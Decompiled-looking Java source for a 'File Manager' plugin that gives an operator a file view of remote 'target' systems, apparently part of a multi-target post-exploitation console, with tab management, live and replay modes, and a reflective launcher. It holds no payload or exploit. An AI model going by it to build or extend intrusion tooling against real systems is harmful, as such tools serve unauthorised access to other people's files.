package ddb.dsz.plugin.filemanager.ver3;

import ddb.detach.TabbableFrame;
import ddb.detach.Workbench.WorkbenchAction;
import ddb.dsz.annotations.DszDescription;
import ddb.dsz.annotations.DszLive;
import ddb.dsz.annotations.DszLogo;
import ddb.dsz.annotations.DszName;
import ddb.dsz.core.host.HostInfo;
import ddb.dsz.plugin.filemanager.ver3.browser.Browser;
import ddb.dsz.plugin.filemanager.ver3.search.Search;
import ddb.dsz.plugin.multitarget.MultipleTargetPlugin;
import ddb.dsz.plugin.multitarget.MultipleTargetWorkbench;
import ddb.dsz.plugin.multitarget.SingleTargetInterface;
import ddb.dsz.plugin.multitarget.MultipleTargetPlugin.LocalHostState;
import ddb.targetmodel.filemodel.FileSystemModel;
import java.lang.reflect.Method;

@DszLive(
   live = true,
   replay = true
)
@DszLogo("images/file-manager.png")
@DszName("Files")
@DszDescription("Provides file view of the target system")
public class FileManager extends MultipleTargetPlugin {
   public FileManager() {
      super.setName("File Manager");
      super.setShowButtons(false);
   }

   protected final int init3() {
      ((FileManagerWorkBench)FileManagerWorkBench.class.cast(this.tabWorkbench)).setCore(this.core);
      super.setDisplay(super.tabWorkbench);
      this.tabWorkbench.setTabPlacement(2);
      return 0;
   }

   protected MultipleTargetWorkbench generateWorkbench() {
      return new FileManagerWorkBench(this);
   }

   protected SingleTargetInterface newHost(HostInfo var1) {
      return new Browser(var1, this.core, this, FileSystemModel.ROOT);
   }

   public void newBrowser(HostInfo var1, long var2) {
      this.tabWorkbench.enqueAction(WorkbenchAction.ADDNEWTAB, new Object[]{new Browser(var1, this.core, this, var2)});
   }

   public void newSearch(HostInfo var1, long var2) {
      this.tabWorkbench.enqueAction(WorkbenchAction.ADDNEWTAB, new Object[]{new Search(var1, this.core, this, var2)});
   }

   public void remove(FileManagerHost var1) {
      this.demulti.removeCommandEventListener(var1);
      this.tabWorkbench.enqueAction(WorkbenchAction.REMOVETAB, new Object[]{var1});
      TabbableFrame var2 = var1.getFrame();
      if (var2 != null) {
         var2.dispose();
      }

      var1.fini();
   }

   protected LocalHostState getLocalHostState() {
      return this.core.isDebugMode() ? LocalHostState.SHOW : LocalHostState.IGNORE;
   }

   public String newItemName() {
      return "New Browser";
   }

   public static void main(String[] var0) throws Throwable {
      Class var1 = Class.forName("ds.plugin.live.DSClientApp");
      Class var2 = Class.forName("ds.plugin.replay.OpReplayDriver");
      Method var3 = var1.getMethod("main", var0.getClass());
      var3.invoke((Object)null, var0);
   }
}
